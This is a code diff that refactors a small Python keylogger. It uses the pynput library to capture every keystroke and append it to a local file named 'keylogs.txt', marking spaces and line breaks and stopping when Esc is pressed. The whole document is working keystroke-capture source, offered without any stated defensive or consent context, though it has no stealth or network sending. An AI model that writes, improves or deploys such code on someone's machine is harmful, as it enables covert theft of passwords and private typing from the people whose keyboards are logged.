@@ -1,27 +1,21 @@
-import os
-from pynput import keyboard
+import pynput.keyboard as keyboard
 
 def on_press(key):
     try:
-        if key == keyboard.Key.space:
-            with open('keylogs.txt', 'a') as f:
-                f.write('[SPACE] ')
-        elif key == keyboard.Key.enter:
-            with open('keylogs.txt', 'a') as f:
-                f.write('\n')
-        else:
-            with open('keylogs.txt', 'a') as f:
-                f.write(f'{key} ')
-    except AttributeError:
-        pass
+        with open('keylogs.txt', 'a', encoding='utf-8') as file:
+            if key == keyboard.Key.space:
+                file.write('[SPACE] ')
+            elif key == keyboard.Key.enter:
+                file.write('\n')
+            else:
+                char = str(key).replace("'", "")
+                file.write(char)
+    except Exception as e:
+        print(f"Error writing to file: {e}")
 
 def on_release(key):
     if key == keyboard.Key.esc:
         return False
-
-if not os.path.exists('keylogs.txt'):
-    with open('keylogs.txt', 'w') as f:
-        pass
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
